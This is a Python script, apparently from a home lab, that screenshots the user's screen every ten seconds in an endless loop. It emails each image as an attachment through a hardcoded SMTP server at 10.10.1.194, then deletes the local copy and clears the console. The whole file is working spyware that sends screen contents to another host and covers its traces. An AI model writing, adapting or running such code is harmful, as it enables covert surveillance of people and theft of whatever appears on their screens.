
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from getpass import getpass,getuser
from email import encoders
import pyautogui
import smtplib
import email
import time
import ssl
import sys
import os

def TakeScreenShot():
    time_stamp = time.ctime()
    time_stamp = time_stamp.replace(' ','_')
    time_stamp = time_stamp.replace(':','_')
    file_name  = "screen_shot_"+time_stamp+'.jpg'
    image_path = file_name
    screenshot = pyautogui.screenshot()
    screenshot.save(image_path)
    return image_path

def main():
    #
    print("[*] E-Mail Attachment Transmission Script ")
    #
    current_user = getuser()
    #
    target_directory = "C:\\Users\\"+current_user+"\\Desktop\\"
    #
    os.chdir(target_directory)
    #
    time_stamp = time.ctime()
    #
    sender = 'robert.gaines@homelab.local'
    #
    recipient = 'robert.gaines@homelab.local'
    #
    body = "Screen Shot -> " + time_stamp
    #
    message = MIMEMultipart()
    #
    message['From']    = sender
    #
    message['To']      = recipient
    #
    message['Subject'] = "Screen Shot -> " + time_stamp
    #
    message.attach(MIMEText(body,"plain"))
    #
    attachment = TakeScreenShot() 
    #
    if(os.path.exists(attachment)):
        #
        print('[*] File exists ')
        #
    else:
        #
        print("[!] File could not be located, departing ")
        #
        sys.exit(1)
        #
    with open(attachment,"rb") as attached_file:
        #
        part = MIMEBase("application","octet-stream")
        #
        part.set_payload(attached_file.read())
        #
    encoders.encode_base64(part)
    #
    part.add_header(
        "Content-Disposition",
        f"attachment; filename={attachment}",
        )
    #
    message.attach(part)
    #
    text = message.as_string()
    #
    address_list = ['robert.gaines@homelab.local']
    #
    for address in address_list:
        #
        with smtplib.SMTP("10.10.1.194",25) as server:
            #
            server.sendmail(sender,address,text)
            #
        print("[*] Screen shot successfully transmitted to: %s " % address)
        #
    os.remove(os.path.abspath(attachment))
    #
    print("[*] Sreen shot: %s -> Successfully Removed" % attachment)


if(__name__ == '__main__'):
    #
    while(True):
        #
        try:
            #
            main()
            #
            os.system('cls')
            #
        except Exception as e:
            #
            print("[!] Error: %s " % e)
            #
            pass
            #
        time.sleep(10)
        
